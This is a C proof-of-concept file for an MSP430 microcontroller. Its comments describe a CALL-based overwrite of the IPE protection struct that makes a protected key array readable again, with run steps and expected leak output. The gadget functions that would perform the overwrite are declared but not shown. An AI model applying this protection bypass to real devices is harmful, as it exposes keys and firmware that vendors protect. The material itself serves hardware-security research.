/**
 * CALL overwriting the IPE struct
 *
 * How to run:
 * 1. Load program, run until you see the output.
 * 2. Hard reset, run program again (now with IPE enabled). The exploit will be run now.
 * 3. Hard reset, run the program again. The effect of the exploit will be visible now.
 *
 * Expected output:
 * ----------------
 * Leak: 123 (0)
 * Leak: 3fff (1)
 * Leak: 123 (2)
 * ----------------
 *
 * Explanation:
 * 0: IPE is not yet activated, key is visible.
 * 1: IPE is activated in the default configuration, reading the key returns the default 3fff value.
 * 2: After the exploit, the IPE struct is overwritten and the incorrect area of memory will be protected, making the key visible again.
 */

#include <msp430.h>
#include <stdint.h>
#include <stdio.h>

#pragma DATA_SECTION(IPE_encapsulatedCount, ".ipe_vars")
uint8_t IPE_encapsulatedCount;

#pragma DATA_SECTION(IPE_i, ".ipe_vars")
uint8_t IPE_i;

#pragma DATA_SECTION(IPE_encapsulatedKeys, ".ipe_const")
const uint16_t IPE_encapsulatedKeys[] = {0x0123, 0x4567, 0x89AB, 0xCDEF,
                                         0xAAAA, 0xBBBB, 0xCCCC, 0xDDDD};

void IPE_encapsulatedInit(void);
void IPE_encapsulatedBlink(void);

#pragma PERSISTENT(otherFramVar)
uint8_t otherFramVar = 0;

void make_gadget(void);
void use_gadget(void);

void main(void) {
    WDTCTL = WDTPW | WDTHOLD;   //Stop watchdog timer

    P4DIR |= BIT6;
    P1DIR |= BIT0;
    P4OUT &= ~BIT6;
    P1OUT &= ~BIT0;
    PM5CTL0 &= ~LOCKLPM5;

    printf("Leak: %x (%d)\n", IPE_encapsulatedKeys[0], otherFramVar);

    if (otherFramVar == 1) {
        make_gadget();
        use_gadget();
    }

    otherFramVar++;

    while (1) {
        __no_operation();
    }
}

#pragma CODE_SECTION(IPE_encapsulatedInit, ".ipe")
void IPE_encapsulatedInit(void)
{
    IPE_encapsulatedCount = 1;
}

#pragma CODE_SECTION(IPE_encapsulatedBlink, ".ipe")
void IPE_encapsulatedBlink(void)
{
    P4OUT &= ~BIT6;
    P4DIR |= BIT6;

    TA0CCTL0 = CCIE;
    TA0CCR0 = 50000;

    for(IPE_i = 0; IPE_i < 8; IPE_i++)
        AESAKEY = IPE_encapsulatedKeys[IPE_i];

    for(IPE_i = 0; IPE_i < IPE_encapsulatedCount; IPE_i++)
    {
        P4OUT |= BIT6;                          //Turn red LED on
        TA0CTL = TASSEL__SMCLK| MC__UP | TACLR; //Start timer
        __bis_SR_register(LPM0_bits + GIE);     //Sleep until timer int (50ms)
        __no_operation();
        P4OUT &= ~BIT6;                         //Turn red LED off
        __bis_SR_register(LPM0_bits + GIE);     //Sleep until timer int (50ms)
        __no_operation();
        TA0CTL = 0;                             //Stop timer
    }

    if(IPE_encapsulatedCount < 5)
        IPE_encapsulatedCount++;
    else
        IPE_encapsulatedCount = 1;

    AESACTL0 = AESSWRST;

    TA0CCTL0 = 0;
    TA0CCR0 = 0;
    TA0CCR1 = 0;
    TA0CCR2 = 0;
    TA0CTL = 0;
    TA0R = 0;
    P4DIR &= ~BIT6;
    P4OUT &= ~BIT6;

    __asm(" mov.w #0, R4");
    __asm(" mov.w #0, R5");
    __asm(" mov.w #0, R6");
    __asm(" mov.w #0, R7");
    __asm(" mov.w #0, R8");
    __asm(" mov.w #0, R9");
    __asm(" mov.w #0, R10");
    __asm(" mov.w #0, R11");
    __asm(" mov.w #0, R12");
    __asm(" mov.w #0, R13");
    __asm(" mov.w #0, R14");
    __asm(" mov.w #0, R15");
}

#pragma CODE_SECTION(TIMER0_A0_ISR, ".ipe:_isr")
#pragma vector=TIMER0_A0_VECTOR
__interrupt
void TIMER0_A0_ISR(void)
{
    __bic_SR_register_on_exit(LPM0_bits); //Wake the device on ISR exit
    __no_operation();
}
